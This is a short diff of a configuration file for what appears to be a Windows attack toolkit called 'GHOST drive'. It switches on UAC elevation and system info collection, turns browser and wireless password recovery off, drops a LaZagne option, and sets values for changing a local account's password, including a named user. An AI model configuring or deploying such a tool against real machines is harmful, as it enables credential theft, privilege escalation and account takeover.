@@ -2,7 +2,7 @@
 
 # ->initializing controls
 exec_mode = "normal"
-uac_elevation = 0
+uac_elevation = 1
 duplicate_exec = 1
 multi_arch = 1
 
@@ -10,7 +10,7 @@ multi_arch = 1
 msgbox = {
     'controller': 1,
     'title': "GHOST drive",
-    'msg': "Driveby complete !!!",
+    'msg': "Driveby complete",
     'buttons': 0
 }
 power = {
@@ -21,26 +21,25 @@ power = {
 }
 
 # ->password recovery
-browser_pwds = 1
-wireless_keys = 1
+browser_pwds = 0
+wireless_keys = 0
 email_pst_pwds = 0
 mail_pwds = 0
 network_pwds = 0
 msn_pwds = 0
 dialup_pwds = 0
-lazagne = 0
 
 # ->password moding
 change_nt_pwd = {
     'current_acc_controller': 0,
-    'current_acc_pwd': "",
+    'current_acc_pwd': "new password",
     'diff_acc_controller': 0,
-    'diff_acc_usr': "username",
+    'diff_acc_usr': "Ebrahim",
     'diff_acc_pwd': "a password"
 }
 
 # ->recon
-batch_info = 0
+batch_info = 1
 network_scan = 0
 
 # ->network based executions
